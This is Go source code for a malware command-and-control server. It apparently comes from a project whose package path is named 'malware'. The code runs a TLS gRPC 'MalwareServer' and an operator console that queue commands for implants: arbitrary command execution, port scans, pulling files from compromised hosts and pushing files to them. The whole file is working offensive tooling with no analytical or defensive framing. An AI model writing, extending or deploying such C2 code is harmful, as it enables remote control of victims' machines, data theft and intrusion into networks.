package main

import (
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	pb "malware/common/messages"
	"malware/common/types"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

type c2 struct {
	port  int
	queue chan *pb.CheckCmdReply
	term  *readline.Instance
}

func (c2 *c2) writeString(str string) {
	log.Print(str)
}

func (c2 *c2) handleReply(reply *pb.ImplantReply) {
	if err := reply.GetError(); err != 0 {
		c2.writeString("Error: " + types.ErrorToString[err] + "\n")
	} else {
		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1) + "\n")
	}
}

func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
	switch u := req.Message.(type) {
	case *pb.CheckCmdRequest_Heartbeat:
		select {
		case x, ok := <-c2.queue:
			if ok {
				return x, nil
			} else {
				panic("Queue closed")
			}
		default:
		}
	case *pb.CheckCmdRequest_Reply:
		c2.handleReply(u.Reply)
	default:
		fmt.Println(req, u)
		panic("Didn't received a valid message")
	}
	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
}

func (c2 *c2) help() {
	c2.writeString("Commands: (If module is enabled)")
	c2.writeString("\tlist                      -> List enabled modules")
	c2.writeString("\tportscan <ip> <from> <to> -> Scan ports")
	c2.writeString("\texec <cmd>                -> Exec command")
	c2.writeString("\tgetfile <filename>        -> Get file from server")
	c2.writeString("\tputfile <local> <remote>  -> Put file from server")
}

func (c2 *c2) handle(text string) {
	parts := strings.Split(strings.TrimSpace(text), " ")
	switch parts[0] {
	case "portscan":
		if len(parts) != 4 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		start, err := strconv.Atoi(parts[2])
		if err != nil {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		end, err := strconv.Atoi(parts[3])
		if err != nil {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}

		message := &pb.PortScan{Ip: parts[1], StartPort: int32(start), EndPort: int32(end)}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
	case "exec":
		if len(parts) < 2 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		message := &pb.Exec{Exec: parts[1], Args: parts[2:]}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
	case "getfile":
		if len(parts) != 2 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		message := &pb.GetFile{Filename: parts[1]}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Getfile{Getfile: message}}
	case "putfile":
		if len(parts) != 3 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		out, err := ioutil.ReadFile(parts[1])
		if err != nil {
			fmt.Println("Can't find file: " + parts[1])
			return
		}
		message := &pb.UploadFile{Filename: parts[2], Contents: out}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
	case "list":
		message := &pb.ListModules{}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Listmodules{Listmodules: message}}
	case "help":
		c2.help()
	default:
		c2.writeString("Cmd not found: " + parts[0] + "\n")
	}
}

func (c2 *c2) ReadUserInput() {
	for {
		line, err := c2.term.Readline()
		if err == readline.ErrInterrupt {
			continue
		} else if err == io.EOF {
			break
		}

		c2.handle(line)

	}
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

var completer = readline.NewPrefixCompleter(
	readline.PcItem("exec"),
	readline.PcItem("getfile"),
	readline.PcItem("putfile"),
	readline.PcItem("portscan"),
	readline.PcItem("help"),
)

func main() {
	if len(os.Args) != 3 {
		panic("Require Cert and Key as argument")
	}

	creds, err := credentials.NewServerTLSFromFile(os.Args[1], os.Args[2])

	if err != nil {
		panic(err)
	}

	l, err := readline.NewEx(&readline.Config{
		Prompt:          "\033[34mc2%\033[0m ",
		HistoryFile:     "/tmp/readline.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	if err != nil {
		panic(err)
	}
	defer l.Close()
	log.SetOutput(l.Stderr())

	c2 := &c2{port: _C2_PORT_, queue: make(chan *pb.CheckCmdReply, 100), term: l}
	host := fmt.Sprintf(":%d", c2.port)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		panic(err)
	}

	defer listener.Close()

	server := grpc.NewServer(grpc.Creds(creds))

	pb.RegisterMalwareServer(server, c2)

	go func() {
		c2.ReadUserInput()
		server.Stop()

	}()
	server.Serve(listener)
	fmt.Println("Exiting")
}
